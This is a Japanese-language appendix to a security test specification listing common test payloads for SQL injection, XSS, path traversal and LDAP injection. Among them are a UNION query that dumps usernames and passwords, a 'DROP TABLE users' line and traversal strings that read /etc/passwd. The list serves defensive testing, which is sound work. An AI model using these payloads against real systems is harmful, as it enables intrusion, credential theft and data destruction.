# セキュリティテスト - 一般的な攻撃ペイロード

**親ドキュメント**: [../templates/test-specs/security-test-spec-template.md](../templates/test-specs/security-test-spec-template.md)

このドキュメントでは、セキュリティテストで使用される一般的な攻撃ペイロードの例を示します。

---

## Appendix B: Common Attack Payloads

### SQL Injection Payloads

```sql
' OR '1'='1' --
' OR '1'='1' /*
admin' --
admin' #
' UNION SELECT NULL, username, password FROM users --
1'; DROP TABLE users; --
```

### XSS Payloads

```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<iframe src="javascript:alert('XSS')">
<body onload=alert('XSS')>
```

### Path Traversal Payloads

```text
../../etc/passwd
....//....//etc/passwd
..%2F..%2Fetc%2Fpasswd
..%252F..%252Fetc%252Fpasswd
```

### LDAP Injection Payloads

```text
*)(uid=*))(|(uid=*
admin)(&(password=*))
*)(objectClass=*)
```

---

